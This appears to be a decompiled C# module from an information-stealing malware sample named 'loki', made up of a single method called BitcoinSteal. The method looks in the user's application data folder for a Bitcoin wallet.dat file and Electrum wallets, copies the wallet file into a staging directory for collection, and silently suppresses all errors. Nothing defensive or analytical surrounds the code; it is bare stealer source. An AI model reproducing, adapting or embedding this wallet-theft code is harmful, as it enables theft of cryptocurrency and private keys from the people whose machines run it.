using System;
using System.IO;

namespace loki.loki.Utilies.Wallets
{
	// Token: 0x02000029 RID: 41
	internal class Wallets
	{
		// Token: 0x06000169 RID: 361 RVA: 0x00008ED8 File Offset: 0x000070D8
		public static void BitcoinSteal(string dir)
		{
			try
			{
				string text = Path.Combine(dir, "Wallets");
				if (File.Exists(Path.Combine(Environment.GetFolderPath(Environment.SpecialFolder.ApplicationData), "Bitcoin", "wallet.dat")) || Directory.Exists(Path.Combine(Environment.GetFolderPath(Environment.SpecialFolder.ApplicationData), "Electrum", "wallets")))
				{
					Directory.CreateDirectory(text);
					try
					{
						if (File.Exists(Path.Combine(Environment.GetFolderPath(Environment.SpecialFolder.ApplicationData), "Bitcoin", "wallet.dat")))
						{
							Directory.CreateDirectory(Path.Combine(text, "Bitcoin"));
							File.Copy(Path.Combine(Environment.GetFolderPath(Environment.SpecialFolder.ApplicationData), "Bitcoin", "wallet.dat"), Path.Combine(text, "Bitcoin", "wallet.dat"));
						}
					}
					catch
					{
					}
					try
					{
						if (Directory.Exists(Path.Combine(Environment.GetFolderPath(Environment.SpecialFolder.ApplicationData), "Electrum", "wallets")))
						{
							Directory.CreateDirectory(Path.Combine(text, "Electrum"));
						}
					}
					catch
					{
					}
				}
			}
			catch
			{
			}
		}
	}
}
